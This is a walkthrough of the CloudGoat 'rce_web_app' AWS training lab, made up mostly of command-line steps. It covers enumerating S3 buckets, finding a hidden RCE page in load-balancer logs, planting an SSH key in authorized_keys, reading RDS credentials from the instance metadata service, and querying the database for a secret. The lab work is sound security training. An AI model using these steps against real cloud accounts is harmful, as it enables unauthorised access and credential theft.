# Remote Code Execution Web Application
Starting as the IAM user Lara, the attacker explores a Load Balancer and S3 bucket for clues to vulnerabilities, leading to an RCE exploit on a vulnerable web app which exposes confidential files and culminates in access to the scenario’s goal: a highly-secured RDS database instance.

Alternatively, the attacker may start as the IAM user McDuck and enumerate S3 buckets, eventually leading to SSH keys which grant direct access to the EC2 server and the database beyond.

Goal: Find a secret stored in the RDS database.

# Walkthrough

## Lara

### Login and list s3 buckets
```
aws configure --profile lara

aws s3 ls --profile lara
Found bucket cg-logs-s3-bucket-rce-web-app-cgid6x7jlbqy5x 
```

### Search through logs to find admin URL
```
aws s3 ls s3://cg-logs-s3-bucket-rce-web-app-cgid6x7jlbqy5x --recursive --profile lara

aws s3 cp s3://cg-logs-s3-bucket-rce-web-app-cgid6x7jlbqy5x/cg-lb-logs/AWSLogs/672021671131/elasticloadbalancing/us-east-1/2019/06/19/555555555555_elasticloadbalancing_us-east-1_app.cg-lb-cgidp347lhz47g.d36d4f13b73c2fe7_20190618T2140Z_10.10.10.100_5m9btchz.log . --profile file

Found mkja1xijqf0abo1h9glg.html secret page
```

### Search for right URL 
```
aws elbv2 describe-load-balancers --profile lara
Get dns name: cg-lb-rce-web-app-cgid6x7jlbqy5x-1607770352.us-east-1.elb.amazonaws.com

http://cg-lb-rce-web-app-cgid6x7jlbqy5x-1607770352.us-east-1.elb.amazonaws.com/mkja1xijqf0abo1h9glg.html 

Found RCE vulnerbility
```

### Login into ec2 instance
```
In the Vulnerable Web Page
ssh-keygen -t ed25519 

Get public key 

Add public key to authorized keys
echo "ssh-ed25519 ..." >> /home/ubuntu/.ssh/authorized_keys

Get ip of ec2 instance
curl ifconfig.me

In your local desktop
ssh -i id_ed25519 ubuntu@54.92.227.80

```

### Option 1: Query metadata service and get rds credentials
```
In the web browser of vulnerable page: curl http://169.254.169.254/latest/user-data

In the remote desktop: psql postgresql://cgadmin:Purplepwny2029@cg-rds-instance-rce-web-app-cgid6x7jlbqy5x.cgsyel6spw2r.us-east-1.rds.amazonaws.com:5432/cloudgoat

```

### Option 2: Use ec2 shell 

```
In the remote desktop

Install AWS CLI
sudo apt-get install awscli

List s3 buckets 
aws s3 ls 
Found secret bucket: cg-secret-s3-bucket-rce-web-app-cgid6x7jlbqy5x
aws s3 ls s3://cg-secret-s3-bucket-rce-web-app-cgid6x7jlbqy5x --recursive
Found db.txt and DB name: cloudgoat, Username: cgadmin, Password: Purplepwny2029

List rds instances for endpoint
aws rds describe-db-instances --region us-east-1

Login to the psql
psql postgresql://cgadmin:Purplepwny2029@cg-rds-instance-rce-web-app-cgid6x7jlbqy5x.cgsyel6spw2r.us-east-1.rds.amazonaws.com:5432/cloudgoat

Retrieve secret
SELECT * from sensitive_information;
```


## McDuck

### Login and list items in s3
```
aws configure --profile mcduck

aws s3 ls --profile mcduck
Found bucket cg-keystore-s3-bucket-rce-web-app-cgid6x7jlbqy5x

aws s3 ls s3://cg-keystore-s3-bucket-rce-web-app-cgid6x7jlbqy5x --recursive --profile mcduck
Found cloudgoat and cloudgoat.pub
```

### Login to instance via the ssh keys
```
Save the keys
aws s3 cp s3://cg-keystore-s3-bucket-rce-web-app-cgid6x7jlbqy5x/cloudgoat.pub ./ --profile mcduck
aws s3 cp s3://cg-keystore-s3-bucket-rce-web-app-cgid6x7jlbqy5x/cloudgoat ./ --profile mcduck

chmod 400 cloudgoat

Follow the steps above to get the secret
```

# References
https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/scenarios/rce_web_app/README.md